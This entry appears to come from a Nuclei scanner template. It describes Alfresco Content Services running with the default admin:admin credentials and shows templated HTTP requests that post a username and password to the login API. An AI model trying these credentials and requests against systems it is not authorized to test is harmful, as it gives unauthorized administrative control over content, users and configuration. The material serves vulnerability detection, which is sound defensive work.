# Vulnerability: Alfresco - Default Admin Credentials
**Classification:** ALFRESCO
**Source:** Nuclei Template (`alfresco-default-login.yaml`)

## Description
Detected Alfresco Content Services was found to have been using the default administrator credentials (admin:admin). An attacker could have gained full administrative access to manage content, users, and repository configuration.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /alfresco/ HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /alfresco/service/api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"{{username}}","password":"{{password}}"}
```

